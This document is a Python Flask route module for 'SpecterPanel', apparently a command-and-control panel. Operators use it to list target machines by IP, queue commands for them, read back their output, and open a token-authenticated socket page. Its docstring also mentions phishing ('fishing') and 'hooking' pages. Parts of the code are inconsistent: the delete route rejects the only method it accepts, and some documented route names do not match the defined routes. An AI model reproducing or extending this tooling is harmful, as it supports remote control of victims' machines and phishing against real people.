# -*- coding: utf-8 -*-
"""
SpecterPanel - View Routes
This module defines the view routes for the SpecterPanel application.
These routes handle user interactions with the web interface,
including dashboard, API commands, API links, fishing, hooking, and settings.
It uses Flask's Blueprint to organize the routes and render templates.
It also includes error handling and session management.
It provides functionality for managing API commands, links, and user settings.
It requires user authentication for most routes and redirects to login if the user is not authenticated.
It also includes functionality for checking command updates and deleting commands.
It uses SQLAlchemy for database interactions and JSON files for data storage.
         Routes:
            - /dashboard: Displays the user's dashboard with targets.
            - /api_command/<targetName>: Handles API command operations for a specific target.
            - /check_commads_updates/<target_name>: Checks for updates to API commands for a given target.
            - /api_command/delete: Deletes an API command for a given target and command ID.
            - /api_command/api/<targetName>: Returns all API commands for the given target and logged-in user.
            - /socket/<target_name>: Renders the socket page for a specific target.
            - /api_link: Manages API links for the logged-in user.
            - /api_link_delete/<ID>: Deletes an API link by its ID for the logged-in user.
            - /api_link_update/<ID>: Updates an existing API link by its ID.
            - /fishing: Renders the fishing page for the logged-in user.
            - /hooking: Renders the hooking page for the logged-in user.
            - /code: Renders the code page for the logged-in user.
            - /settings: Renders the settings page for the logged-in user.
        Route info:
            - Each route checks if the user is authenticated by checking the session.
            - If the user is not authenticated, they are redirected to the login page.
            - The routes handle both GET and POST requests as needed.
            - The routes use SQLAlchemy to query the database and retrieve necessary data. 
            - The routes render HTML templates using Flask's render_template function.
            - The routes handle exceptions and log errors using a custom log function.
        Route usage:
            - Users can access the dashboard to view their targets and API commands.
            - Users can execute API commands for specific targets and view command history.
            - Users can manage API links and delete or update them as needed.
            - Users can access the fishing and hooking pages for additional functionality.
            - Users can view and update their settings.
"""

from flask import render_template, url_for, Blueprint, request, session, flash, redirect, jsonify
from sqlalchemy.orm import sessionmaker
from urllib.parse import unquote

from db.modle import Users, APICommand, APILink, Targets, Instraction, ApiToken
from db.mange_db import config, _create_engine
from utility.email_temp import email_temp
from utility.processer import log, getlist, readFromJson, delete_data

emailTemplate = email_temp()

Session = sessionmaker(bind=_create_engine())
_session = Session()

view = Blueprint("view", __name__, template_folder="templates")


@view.route("/dashboard")
def dashboard():
    """
    Render the dashboard page for the logged-in user.
    Displays targets associated with the user's email.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        email = session['email']
        print(email)
        targets = getlist(_session.query(Targets).filter_by(user_email=session['email']).all(), sp=',')
        _targets = []
        for target in targets:
            target_ = readFromJson('target-info',target[0])
            if '127.0.0.1' in target_['ip']:
                conn = 'local'
            elif '192.168' in target_['ip']:
                conn = 'wifi'
            else:
                # , mdi mdi-ethernet-cable
                conn = 'ethernet'
            _targets.append((target_, conn, target[0]))

        if request.method != 'GET':
            return redirect(url_for('event.page_404'))
        return render_template('dashboard.html', targets=_targets)
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


@view.route("/api_command/<targetName>", methods=['GET', 'POST'])
def api_command(targetName=None):
    """
    Handle API command operations for a specific target.
    GET: Show command history and output for the target.
    POST: Add a new command for the target.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        if targetName is not None:
            try:
                if request.method == 'GET':
                    # STUTAS = ['Active', 'Inactive']
                    # CHECK_UPDATE = ['checked', 'unchecked']
                    targets = getlist(_session.query(Targets).filter_by(target_name=targetName).all(), sp=',')
                    instraction = getlist(_session.query(Instraction).filter_by(target_name=targetName).all(), sp=',')
                    if len(targets) != 0 and len(instraction) != 0:
                        _session.query(Instraction).filter_by(
                                target_name=targetName,instraction=config.INSTRACTION[0]
                            ).update({
                                'stutas': config.STUTAS[0]
                        })
                        _session.commit()
                        output = readFromJson('output',targetName)
                        cmd = getlist(_session.query(APICommand).filter_by(
                                target_name=targetName,
                                condition = config.STUTAS[0],
                                update=config.CHECK_UPDATE[0]
                            ).all(), 
                        sp=',')
                        return render_template('api_command.html',cmd=cmd ,output=output)
                    else:
                        flash(f'No such a target {targetName}')
                        return redirect(request.referrer)
            
                elif request.method == 'POST':

                    CMD = request.json.get('input')
                    ID = config.ID(n=7)
                    print(targetName)
                    add_cmd = APICommand(
                        ID, session['email'],
                        targetName, CMD, config.STUTAS[1]
                    )
                    _session.add(add_cmd)
                    _session.commit()

                    return {
                            'message': 'command saved successfully',
                            'id': ID,
                            'target_name': targetName
                        }, 200
            
            except Exception as e:
                print(e)
                _session.rollback()
                log(f'[ERROR ROUT] : {request.endpoint} error: {e}')
                return redirect(url_for('event.page_500'))
            finally:
                _session.close()
        else:
            flash('pleas provid target name')
            return redirect(url_for("view.profile")) 

    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


@view.route('/check_command_update/<target_name>', methods=['GET'])
def check_command_update(target_name):
    '''
    Check for updates to API commands for a given target.
    This route checks if any commands for the specified target have been updated.
    It retrieves the commands from the database and checks their update status.
    Returns a JSON response with the updated commands or a message if no updates are found.
    Only accessible to authenticated users.
    Redirects to login if the user is not authenticated.
    Usage:
        GET /check_command_update/<target_name>
    Parameters:
        target_name (str): The name of the target for which to check command updates.
    Returns:
        JSON response with updated commands or a message indicating no updates.
    Example response:
        {
            "message": "Commands checked successfully",
            "updated_commands": [
                ("command_output","command_id")
            ]
        }
        or
        {
            "message": "No commands to check for updates"
        }
    Error handling:
        If an error occurs during the process, it logs the error and returns a 500 status code with an error message.
        If the user is not authenticated, it redirects to the login page.
    Usage example:
        curl -X GET http://example.com/check_command_update/my_target
    Note:
        This route requires the user to be logged in. If the user is not authenticated, they will be redirected to the login page.
        The target_name parameter should match the name of a target.
    '''
    if "email" not in session:
        flash("You must login first")
        return redirect(url_for("public.login"))

    try:
        # STUTAS = ['Active', 'Inactive']
        # CHECK_UPDATE = ['checked', 'unchecked']
        decoded_target = unquote(target_name)  # Handle special characters like ":"
        cmd_rows = _session.query(APICommand).filter_by(
            target_name=decoded_target,
            condition=config.STUTAS[0],  # "Active" or "Pending" commands
            update=config.CHECK_UPDATE[1]
        ).all()

        updated_commands = []

        if cmd_rows:
            outputs = readFromJson('output', decoded_target)  # Read output JSON once
            print(f'[DEBUG] Outputs for {decoded_target}: {outputs}')

            for cmd in cmd_rows:
                print(f'[DEBUG] Processing command: {cmd.ID}, update status: {cmd.update}')
                if cmd.update == 'unchecked':
                    if cmd.ID in outputs:
                        cmd.update = config.CHECK_UPDATE[0]  # e.g., "checked"
                        updated_commands.append((
                            outputs[cmd.ID],  # Command output
                            cmd.ID  # Command ID
                        ))
                        _session.query(APICommand).filter_by(ID=cmd.ID).update({
                            'update': config.CHECK_UPDATE[0]  # Update status to "checked"
                        })

            _session.commit()  # Commit updates only once after processing all
        elif len(cmd_rows) == 0:
            return jsonify({
                "message": "No commands to check for updates",
                "detail": "No matching active commands found",
                "updated_commands": []
            }), 200

        return jsonify({
            "message": "Commands checked successfully",
            "detail": f"Updated commands found: {len(updated_commands)}",
            "updated_commands": updated_commands
        }), 200

    except Exception as e:
        log(f'[ERROR ROUTE] : {request.endpoint} -> {e}')
        _session.rollback()
        return jsonify({'error': 'Server side error'}), 500

    finally:
        _session.close()

@view.route('/api_command/delete',methods=['DELETE'])
def delete_command():
    """
    Delete an API command for a given target and command ID.
    Only accessible to authenticated users.
    """
    if "email" in session:
        if request.method != "POST":
            return {'message': 'Unsupported method'}
        target_name = request.json.get('target_name')
        ID = request.json.get('id')
       
        try:
            deleted_data = delete_data(target_name,ID)
            if deleted_data:
                _session.query(APICommand).filter_by(ID=ID).delete()
                _session.commit()
                output = readFromJson('output',target_name)
                cmd = getlist(_session.query(APICommand).filter_by(target_name=target_name).all(), sp=',')
                return {
                        'mesasage': 'Deleted Succsesfuly',
                        'cmd':cmd,
                        'output': output
                    }
        except Exception as e:
            _session.rollback()
            log(f'[ERROR ROUT] : {request.endpoint} error: {e}')
            return {'message': 'Somthing went wrong'}

    else:
        return {'message':"you must login first"}


@view.route('/api_command/api/<targetName>')
def api_command_(targetName):
    """
    Return all API commands for the given target and logged-in user.
    Returns JSON response.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        try:
            apiCommand = getlist(_session.query(APICommand).filter_by(email=session['email'], target_name=targetName).all(), sp=',')
            return {'allCommand': apiCommand}, 200
        
        except Exception as e:

            log(f'[ERROR ROUT] : {request.endpoint} error: {e}')
            _session.rollback()
            return {'error': 'Server side Error'}, 500
        
        finally:
            _session.close()
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))

@view.route("/socket/<target_name>")
def socket_page(target_name):
    """
    Render the socket page for a specific target.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        token = getlist(_session.query(ApiToken).filter_by(user_email=session['email']).all(), sp=',')[0][1]
        targets = getlist(_session.query(Targets).filter_by(target_name=target_name).all(), sp=',')
        if len(targets) != 0 and len(token) != 0:
            return render_template('socket.html', target_name=target_name,token=token)
        else:
            flash(f'No such a target {target_name}')
            return redirect(request.referrer)
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))



@view.route("/api_link", methods=["GET", "POST"])
def api_link():
    """
    Manage API links for the logged-in user.
    GET: Show all API links and available targets.
    POST: Add a new API link.
    Redirects to login if the user is not authenticated.
    """
    if "email" not in session:
        flash("You must login first")
        return redirect(url_for("public.login"))

    if request.method == "POST":
        try:
            new_link = APILink(
                ID=config.ID(),
                email=session["email"],
                target_name=request.form.get("target_name"),
                link=request.form.get("link"),
                action_type=request.form.get("action_type"),
                condition=int(request.form.get("condition", 0))
            )
            _session.add(new_link)
            _session.commit()
            return redirect(url_for("view.api_link"))
        
        except Exception as e:
            print(e)
            _session.rollback()
            log(f'[ERROR ROUT] : {request.endpoint} error: {e}')
            return redirect(url_for('event.page_500'))
        finally:
            _session.close()

    links = _session.query(APILink).filter_by(email=session["email"]).all()
    targetInfo = getlist(_session.query(Targets).filter_by(user_email=session['email']).all(), sp=',')
    targets = [target[0] for target in targetInfo]
    print(targets)
    return render_template("api_link.html", links=links, targets=targets)


@view.route("/api_link_delete/<ID>")
def link_delete(ID=None):
    """
    Delete an API link by its ID for the logged-in user.
    Only accessible via GET method.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        if ID:
            if request.method != 'GET':
                flash(f'unknown method {request.method}')
                return redirect(request.referrer)
            try:
                link = getlist(_session.query(APILink).filter_by(ID=ID).all(),sp=',')
                print(link)
                if link:
                    link_ = _session.query(APILink).filter_by(ID=ID).first()
                    _session.delete(link_)
                    _session.commit()
                    flash(f'deleleted sucssesfuly {link[0][3]}')
                    return {"message": "Deleted succsessfully"},200
            except Exception as e:
                print(str(e))
                log(f'[ERROR ROUT] : {request.endpoint} error: {e}')
                return {"message": "Somting went wrong"},500
            finally:
                _session.close()
        else:
            flash('unkown link')
            return redirect(request.referrer)
    else:
        flash("You must login first")
        return redirect(url_for("public.login"))


@view.route('/api_link_update/<ID>',methods=['POST'])
def link_update(ID):
    """
    Update an existing API link by its ID.
    Only accessible to authenticated users via POST.
    """
    if 'email' in session:
        if request.method == 'POST':
            try:
                _session.query(APILink).filter_by(ID=ID).update({
                    'target_name': request.form['target_name'],
                    'link': request.form['link'],
                    'action_type': request.form['action_type']
                })
                _session.commit()
                return redirect(request.referrer)
            except Exception as e:
                print(e)
                _session.rollback()
                log(f'[ERROR ROUT] : {request.endpoint} error: {e}')
                return redirect(url_for('event.page_500'))
        else:
            return redirect(request.referrer)
    else:
        return redirect(url_for('public.login'))


@view.route("/code")
def code():
    """
    Render the code page for the logged-in user.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        return render_template('code.html')
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


@view.route("/settings",methods=['POST','GET'])
def setting():
    """
    Render the settings page for the logged-in user.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        return render_template('setting.html')
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))
